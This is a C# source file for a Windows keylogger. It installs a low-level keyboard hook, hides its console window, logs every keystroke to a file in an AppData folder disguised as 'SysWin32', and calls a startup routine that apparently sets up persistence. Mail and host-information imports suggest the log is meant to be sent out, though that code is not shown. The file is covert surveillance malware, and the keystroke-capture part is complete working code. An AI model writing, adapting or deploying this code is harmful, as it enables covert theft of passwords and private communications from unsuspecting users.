using System;
using System.Text;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Timers;
using System.Net;
using System.Net.Mail;
using System.Windows.Forms;
using System.IO;
using ConsoleApp2.NativeMethods;
using ConsoleApp2.Constants;
using ConsoleApp2.Startup;
using ConsoleApp2.HostInfo;

namespace ConsoleApp1
{
    class Program
    {
        #region variable declarations
        private static Mutex mutex = new Mutex();
        private static IntPtr _hookptr = IntPtr.Zero;
        private static bool uppercase;
        private static StreamWriter _outfile;
        // information about the current host
        private static HostInfo hostInfo;
        #endregion

        public static void Main(string[] args)
        {
            _hookptr = SetHook(KeyBoardProcCallback);
            Utils.SetConsoleWindow(Utils.ConsoleWindowState.SW_HIDE);

            _outfile = new StreamWriter(
                Environment.GetFolderPath(
                    Environment.SpecialFolder.ApplicationData) + @"/SysWin32/logs/log.txt", true, Encoding.Unicode);

            Startup.Init();

            Application.Run();
            NativeMethods.UnhookWindowsHookEx(_hookptr);
        }

        /// <summary>
        ///     Register the LowLevelKeyboardProc callback function
        /// </summary>
        /// <param name="func">The callback function</param>
        /// <returns> Returns the newly created hook procedure </returns>
        public static IntPtr SetHook(NativeMethods.LowLevelKeyboardProc keyboardCallback)
        {
            using (Process proc = Process.GetCurrentProcess()) {
                using (var procModule = proc.MainModule) {
                    return NativeMethods.SetWindowsHookEx(
                        Constants.whl_keyboard_ll, keyboardCallback, NativeMethods.GetModuleHandle(procModule.ModuleName), 0
                    );
                }
            }
        }

        public static IntPtr KeyBoardProcCallback(int ncode, IntPtr wParam, IntPtr lParam)
        {
            if( ncode == 0 ) {
                if( wParam == (IntPtr) Constants.wm_keydown ) {
                    int vkey = Marshal.ReadInt32(lParam);
                    char key = Char.ToLower(Convert.ToChar( NativeMethods.MapVirtualKey((uint)vkey, Constants.mapvk_to_char) ));
                    DispatchKey(key, vkey, PrintableKey(vkey));
                }
            }
            return NativeMethods.CallNextHookEx(_hookptr, ncode, wParam, lParam);
        }

        public static char ApplyKeyShiftModifier(char key) {
            return KeyMap.keymap.ContainsKey(key) ? KeyMap.keymap[key] : Char.ToUpper(key);
        }

        public static bool PrintableKey(int vkey) {
            return !KeyMap.nonPrintableKeys.Contains(vkey);
        }

        /// <summary>
        ///     Write the buffer to the file and then after that immediately clears that buffer
        /// </summary>
        /// <returns> Doesn't return a value </returns>
        public static void DispatchKey(char key, int vkey, bool isPrintable)
        {
            uppercase = (NativeMethods.GetKeyState(Keys.Capital) & 0x0001) != 0;

            if ((NativeMethods.GetKeyState(Keys.RShiftKey) & 0x1000) != 0 ||
                (NativeMethods.GetKeyState(Keys.LShiftKey) & 0x1000) != 0 ||
                (NativeMethods.GetKeyState(Keys.Shift)     & 0x1000) != 0) {
                uppercase = !uppercase;
            }

            StringBuilder _internal = new StringBuilder();
            if( isPrintable ) {
                key = (uppercase) ? ApplyKeyShiftModifier(key) : key;
                _internal.Append(key);
            } else {
                _internal.Append( "[" + ((Keys)vkey) + "]" );
            }
            _outfile.Write(_internal);
            _outfile.Flush();
        }

        public static void Terminate(string err)
        {
            Console.WriteLine($"{err}");
            Application.Exit();
        }
    }
}